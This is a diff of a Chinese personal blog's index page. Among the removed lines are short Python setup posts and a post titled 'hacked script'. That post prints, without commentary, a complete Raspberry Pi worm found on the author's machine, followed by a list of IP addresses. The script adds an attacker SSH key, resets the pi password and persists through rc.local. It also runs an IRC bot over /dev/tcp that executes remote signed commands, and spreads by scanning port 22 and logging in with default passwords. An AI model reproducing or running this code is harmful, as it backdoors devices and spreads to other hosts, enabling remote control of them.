+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-yuque/整蛊小程序" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -948,200 +1248,6 @@ var _hmt = _hmt || [];
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2020/12/06/yuque/python%E5%AD%A6%E4%B9%A0/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-yuque/python编程IDE" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/12/06/yuque/python%E7%BC%96%E7%A8%8BIDE/">python编程IDE</a>
-    </h1>
-  
-
-        
-        <a href="/2020/12/06/yuque/python%E7%BC%96%E7%A8%8BIDE/" class="archive-article-date">
-  	<time datetime="2020-12-06T10:03:45.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-12-06</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>编程需要好的 IDE 来支持。</p>
-<p>技术编程推荐 pycharm<br>下载地址：<a target="_blank" rel="noopener" href="https://www.jetbrains.com/pycharm/">https://www.jetbrains.com/pycharm/</a><br>windows 教程：<a target="_blank" rel="noopener" href="https://www.runoob.com/w3cnote/pycharm-windows-install.html">https://www.runoob.com/w3cnote/pycharm-windows-install.html</a><br>macos 教程：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/dc396a37ddee">https://www.jianshu.com/p/dc396a37ddee</a></p>
-<p>做数据分析推荐 jupyter notebook（可视化编程所见即所得）<br><a target="_blank" rel="noopener" href="https://jupyter.org/install">https://jupyter.org/install</a><br>教程：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/91365f343585">https://www.jianshu.com/p/91365f343585</a></p>
-<p>爱好者选择 vscode<br>微软大法下载地址：<a target="_blank" rel="noopener" href="https://code.visualstudio.com/">https://code.visualstudio.com/</a></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/12/06/yuque/python%E7%BC%96%E7%A8%8BIDE/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-yuque/python环境准备" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/12/06/yuque/python%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/">python环境准备</a>
-    </h1>
-  
-
-        
-        <a href="/2020/12/06/yuque/python%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/" class="archive-article-date">
-  	<time datetime="2020-12-06T10:03:21.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-12-06</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>目前 python 存在 python2 与 python3 。（语法差异有点大）<br>python2 已经停止维护。<br>请按照 python3 安装。<br>安装教程：<a target="_blank" rel="noopener" href="https://www.runoob.com/python/python-install.html">https://www.runoob.com/python/python-install.html</a></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/12/06/yuque/python%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-yuque/被黑脚本" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/09/28/yuque/%E8%A2%AB%E9%BB%91%E8%84%9A%E6%9C%AC/">被黑脚本</a>
-    </h1>
-  
-
-        
-        <a href="/2020/09/28/yuque/%E8%A2%AB%E9%BB%91%E8%84%9A%E6%9C%AC/" class="archive-article-date">
-  	<time datetime="2020-09-28T16:57:48.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-28</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">MYSELF=`realpath <span class="variable">$0</span>`</span><br><span class="line">DEBUG=/dev/null</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$MYSELF</span> &gt;&gt; <span class="variable">$DEBUG</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$EUID</span>&quot;</span> -ne 0 ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">	NEWMYSELF=`mktemp -u <span class="string">&#x27;XXXXXXXX&#x27;</span>`</span><br><span class="line">	sudo cp <span class="variable">$MYSELF</span> /opt/<span class="variable">$NEWMYSELF</span></span><br><span class="line">	sudo sh -c <span class="string">&quot;echo &#x27;#!/bin/sh -e&#x27; &gt; /etc/rc.local&quot;</span></span><br><span class="line">	sudo sh -c <span class="string">&quot;echo /opt/<span class="variable">$NEWMYSELF</span> &gt;&gt; /etc/rc.local&quot;</span></span><br><span class="line">	sudo sh -c <span class="string">&quot;echo &#x27;exit 0&#x27; &gt;&gt; /etc/rc.local&quot;</span></span><br><span class="line">	sleep 1</span><br><span class="line">	sudo reboot</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">TMP1=`mktemp`</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$TMP1</span> &gt;&gt; <span class="variable">$DEBUG</span></span><br><span class="line"></span><br><span class="line">killall bins.sh</span><br><span class="line">killall minerd</span><br><span class="line">killall node</span><br><span class="line">killall nodejs</span><br><span class="line">killall ktx-armv4l</span><br><span class="line">killall ktx-i586</span><br><span class="line">killall ktx-m68k</span><br><span class="line">killall ktx-mips</span><br><span class="line">killall ktx-mipsel</span><br><span class="line">killall ktx-powerpc</span><br><span class="line">killall ktx-sh4</span><br><span class="line">killall ktx-sparc</span><br><span class="line">killall arm5</span><br><span class="line">killall zmap</span><br><span class="line">killall kaiten</span><br><span class="line">killall perl</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;127.0.0.1 bins.deutschland-zahlung.eu&quot;</span> &gt;&gt; /etc/hosts</span><br><span class="line">rm -rf /root/.bashrc</span><br><span class="line">rm -rf /home/pi/.bashrc</span><br><span class="line"></span><br><span class="line">usermod -p \<span class="variable">$6</span>\<span class="variable">$vGkGPKUr</span>\<span class="variable">$heqvOhUzvbQ66Nb0JGCijh</span>/81sG1WACcZgzPn8A0Wn58hHXWqy5yOgTlYJEbOjhkHD0MRsAkfJgjU/ioCYDeR1 pi</span><br><span class="line"></span><br><span class="line">mkdir -p /root/.ssh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D6s4J0L7XV2kep0rNzgY1S1IdE8HDef7z1ipBVuGTygGsq+x4yVnxveGshVP48YmicQHJMCIljmn6Po0RMC48qihm/9ytoEYtkKkeiTR02c6DyIcDnX3QdlSmEqPqSNRQ/XDgM7qIB/VpYtAhK/7DoE8pqdoFNBU5+JlqeWYpsMO+qkHugKA5U22wEGs8xG2XyyDtrBcw10xz+M7U8Vpt0tEadeV973tXNNNpUgYGIFEsrDEAjbMkEsUw+iQmXg37EusEFjCVjBySGH3F+EQtwin3YmxbB9HRMzOIzNnXwCFaYU5JjTNnzylUBp/XB6B&quot;</span>  &gt;&gt; /root/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;nameserver 8.8.8.8&quot;</span> &gt;&gt; /etc/resolv.conf</span><br><span class="line">rm -rf /tmp/ktx*</span><br><span class="line">rm -rf /tmp/cpuminer-multi</span><br><span class="line">rm -rf /var/tmp/kaiten</span><br><span class="line"></span><br><span class="line">cat &gt; /tmp/public.pem &lt;&lt;<span class="string">EOFMARKER</span></span><br><span class="line"><span class="string">-----BEGIN PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC/ihTe2DLmG9huBi9DsCJ90MJs</span></span><br><span class="line"><span class="string">glv7y530TWw2UqNtKjPPA1QXvNsWdiLpTzyvk8mv6ObWBF8hHzvyhJGCadl0v3HW</span></span><br><span class="line"><span class="string">rXneU1DK+7iLRnkI4PRYYbdfwp92nRza00JUR7P4pghG5SnRK+R/579vIiy+1oAF</span></span><br><span class="line"><span class="string">WRq+Z8HYMvPlgSRA3wIDAQAB</span></span><br><span class="line"><span class="string">-----END PUBLIC KEY-----</span></span><br><span class="line"><span class="string">EOFMARKER</span></span><br><span class="line"></span><br><span class="line">BOT=`mktemp -u <span class="string">&#x27;XXXXXXXX&#x27;</span>`</span><br><span class="line"></span><br><span class="line">cat &gt; /tmp/<span class="variable">$BOT</span> &lt;&lt;<span class="string">&#x27;EOFMARKER&#x27;</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">SYS=`uname -a | md5sum | awk -F<span class="string">&#x27; &#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>`</span><br><span class="line">NICK=a<span class="variable">$&#123;SYS:24&#125;</span></span><br><span class="line"><span class="keyword">while</span> [ <span class="literal">true</span> ]; <span class="keyword">do</span></span><br><span class="line"></span><br><span class="line">	arr[0]=<span class="string">&quot;ix1.undernet.org&quot;</span></span><br><span class="line">	arr[1]=<span class="string">&quot;ix2.undernet.org&quot;</span></span><br><span class="line">	arr[2]=<span class="string">&quot;Ashburn.Va.Us.UnderNet.org&quot;</span></span><br><span class="line">	arr[3]=<span class="string">&quot;Bucharest.RO.EU.Undernet.Org&quot;</span></span><br><span class="line">	arr[4]=<span class="string">&quot;Budapest.HU.EU.UnderNet.org&quot;</span></span><br><span class="line">	arr[5]=<span class="string">&quot;Chicago.IL.US.Undernet.org&quot;</span></span><br><span class="line">	rand=$[<span class="variable">$RANDOM</span> % 6]</span><br><span class="line">	svr=<span class="variable">$&#123;arr[$rand]&#125;</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">eval</span> <span class="string">&#x27;exec 3&lt;&gt;/dev/tcp/$svr/6667;&#x27;</span></span><br><span class="line">	<span class="keyword">if</span> [[ ! <span class="string">&quot;$?&quot;</span> -eq 0 ]] ; <span class="keyword">then</span></span><br><span class="line">			<span class="built_in">continue</span></span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">echo</span> <span class="variable">$NICK</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">eval</span> <span class="string">&#x27;printf &quot;NICK $NICK\r\n&quot; &gt;&amp;3;&#x27;</span></span><br><span class="line">	<span class="keyword">if</span> [[ ! <span class="string">&quot;$?&quot;</span> -eq 0 ]] ; <span class="keyword">then</span></span><br><span class="line">			<span class="built_in">continue</span></span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line">	<span class="built_in">eval</span> <span class="string">&#x27;printf &quot;USER user 8 * :IRC hi\r\n&quot; &gt;&amp;3;&#x27;</span></span><br><span class="line">	<span class="keyword">if</span> [[ ! <span class="string">&quot;$?&quot;</span> -eq 0 ]] ; <span class="keyword">then</span></span><br><span class="line">		<span class="built_in">continue</span></span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># Main loop</span></span><br><span class="line">	<span class="keyword">while</span> [ <span class="literal">true</span> ]; <span class="keyword">do</span></span><br><span class="line">		<span class="built_in">eval</span> <span class="string">&quot;read msg_in &lt;&amp;3;&quot;</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> [[ ! <span class="string">&quot;$?&quot;</span> -eq 0 ]] ; <span class="keyword">then</span></span><br><span class="line">			<span class="built_in">break</span></span><br><span class="line">		<span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>  [[ <span class="string">&quot;<span class="variable">$msg_in</span>&quot;</span> =~ <span class="string">&quot;PING&quot;</span> ]] ; <span class="keyword">then</span></span><br><span class="line">			<span class="built_in">printf</span> <span class="string">&quot;PONG %s\n&quot;</span> <span class="string">&quot;<span class="variable">$&#123;msg_in:5&#125;</span>&quot;</span>;</span><br><span class="line">			<span class="built_in">eval</span> <span class="string">&#x27;printf &quot;PONG %s\r\n&quot; &quot;$&#123;msg_in:5&#125;&quot; &gt;&amp;3;&#x27;</span></span><br><span class="line">			<span class="keyword">if</span> [[ ! <span class="string">&quot;$?&quot;</span> -eq 0 ]] ; <span class="keyword">then</span></span><br><span class="line">				<span class="built_in">break</span></span><br><span class="line">			<span class="keyword">fi</span></span><br><span class="line">			sleep 1</span><br><span class="line">			<span class="built_in">eval</span> <span class="string">&#x27;printf &quot;JOIN #biret\r\n&quot; &gt;&amp;3;&#x27;</span></span><br><span class="line">			<span class="keyword">if</span> [[ ! <span class="string">&quot;$?&quot;</span> -eq 0 ]] ; <span class="keyword">then</span></span><br><span class="line">				<span class="built_in">break</span></span><br><span class="line">			<span class="keyword">fi</span></span><br><span class="line">		<span class="keyword">elif</span> [[ <span class="string">&quot;<span class="variable">$msg_in</span>&quot;</span> =~ <span class="string">&quot;PRIVMSG&quot;</span> ]] ; <span class="keyword">then</span></span><br><span class="line">			privmsg_h=$(<span class="built_in">echo</span> <span class="variable">$msg_in</span>| cut -d<span class="string">&#x27;:&#x27;</span> -f 3)</span><br><span class="line">			privmsg_data=$(<span class="built_in">echo</span> <span class="variable">$msg_in</span>| cut -d<span class="string">&#x27;:&#x27;</span> -f 4)</span><br><span class="line">			privmsg_nick=$(<span class="built_in">echo</span> <span class="variable">$msg_in</span>| cut -d<span class="string">&#x27;:&#x27;</span> -f 2 | cut -d<span class="string">&#x27;!&#x27;</span> -f 1)</span><br><span class="line"></span><br><span class="line">			<span class="built_in">hash</span>=`<span class="built_in">echo</span> <span class="variable">$privmsg_data</span> | base64 -d -i | md5sum | awk -F<span class="string">&#x27; &#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>`</span><br><span class="line">			sign=`<span class="built_in">echo</span> <span class="variable">$privmsg_h</span> | base64 -d -i | openssl rsautl -verify -inkey /tmp/public.pem -pubin`</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$sign</span>&quot;</span> == <span class="string">&quot;<span class="variable">$hash</span>&quot;</span> ]] ; <span class="keyword">then</span></span><br><span class="line">				CMD=`<span class="built_in">echo</span> <span class="variable">$privmsg_data</span> | base64 -d -i`</span><br><span class="line">				RES=`bash -c <span class="string">&quot;<span class="variable">$CMD</span>&quot;</span> | base64 -w 0`</span><br><span class="line">				<span class="built_in">eval</span> <span class="string">&#x27;printf &quot;PRIVMSG $privmsg_nick :$RES\r\n&quot; &gt;&amp;3;&#x27;</span></span><br><span class="line">				<span class="keyword">if</span> [[ ! <span class="string">&quot;$?&quot;</span> -eq 0 ]] ; <span class="keyword">then</span></span><br><span class="line">					<span class="built_in">break</span></span><br><span class="line">				<span class="keyword">fi</span></span><br><span class="line">			<span class="keyword">fi</span></span><br><span class="line">		<span class="keyword">fi</span></span><br><span class="line">	<span class="keyword">done</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">EOFMARKER</span><br><span class="line"></span><br><span class="line">chmod +x /tmp/<span class="variable">$BOT</span></span><br><span class="line">nohup /tmp/<span class="variable">$BOT</span> 2&gt;&amp;1 &gt; /tmp/bot.log &amp;</span><br><span class="line">rm /tmp/nohup.log -rf</span><br><span class="line">rm -rf nohup.out</span><br><span class="line">sleep 3</span><br><span class="line">rm -rf /tmp/<span class="variable">$BOT</span></span><br><span class="line"></span><br><span class="line">NAME=`mktemp -u <span class="string">&#x27;XXXXXXXX&#x27;</span>`</span><br><span class="line"></span><br><span class="line">date &gt; /tmp/.s</span><br><span class="line"></span><br><span class="line">apt-get update -y --force-yes</span><br><span class="line">apt-get install zmap sshpass -y --force-yes</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> [ <span class="literal">true</span> ]; <span class="keyword">do</span></span><br><span class="line">	FILE=`mktemp`</span><br><span class="line">	zmap -p 22 -o <span class="variable">$FILE</span> -n 100000</span><br><span class="line">	killall ssh scp</span><br><span class="line">	<span class="keyword">for</span> IP <span class="keyword">in</span> `cat <span class="variable">$FILE</span>`</span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">		sshpass -praspberry scp -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no <span class="variable">$MYSELF</span> pi@<span class="variable">$IP</span>:/tmp/<span class="variable">$NAME</span>  &amp;&amp; <span class="built_in">echo</span> <span class="variable">$IP</span> &gt;&gt; /opt/.r &amp;&amp; sshpass -praspberry ssh pi@<span class="variable">$IP</span> -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no <span class="string">&quot;cd /tmp &amp;&amp; chmod +x <span class="variable">$NAME</span> &amp;&amp; bash -c ./<span class="variable">$NAME</span>&quot;</span> &amp;</span><br><span class="line">		sshpass -praspberryraspberry993311 scp -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no <span class="variable">$MYSELF</span> pi@<span class="variable">$IP</span>:/tmp/<span class="variable">$NAME</span>  &amp;&amp; <span class="built_in">echo</span> <span class="variable">$IP</span> &gt;&gt; /opt/.r &amp;&amp; sshpass -praspberryraspberry993311 ssh pi@<span class="variable">$IP</span> -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no <span class="string">&quot;cd /tmp &amp;&amp; chmod +x <span class="variable">$NAME</span> &amp;&amp; bash -c ./<span class="variable">$NAME</span>&quot;</span> &amp;</span><br><span class="line">	<span class="keyword">done</span></span><br><span class="line">	rm -rf <span class="variable">$FILE</span></span><br><span class="line">	sleep 10</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>ip<br>18.132.196.152<br>102.37.42.55<br>46.30.234.60<br>46.30.234.60<br>79.98.159.7<br>79.98.159.7<br>54.153.54.230<br>81.151.94.19<br>138.68.91.250<br>138.68.91.250<br>35.200.133.234<br>35.200.133.234<br>68.169.61.66<br>77.240.100.215<br>77.240.100.215<br>54.92.204.47<br>206.189.139.95<br>206.189.139.95<br>54.233.114.207<br>198.199.120.102<br>198.199.120.102<br>81.196.205.195<br>81.196.205.195<br>13.52.183.6<br>68.183.228.248<br>68.183.228.248<br>81.196.205.210<br>81.196.205.210<br>134.209.89.233<br>134.209.89.233<br>153.196.173.38<br>153.196.173.38<br>167.172.119.82</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/09/28/yuque/%E8%A2%AB%E9%BB%91%E8%84%9A%E6%9C%AC/">展开全文 >></a>
         </p>
       
 
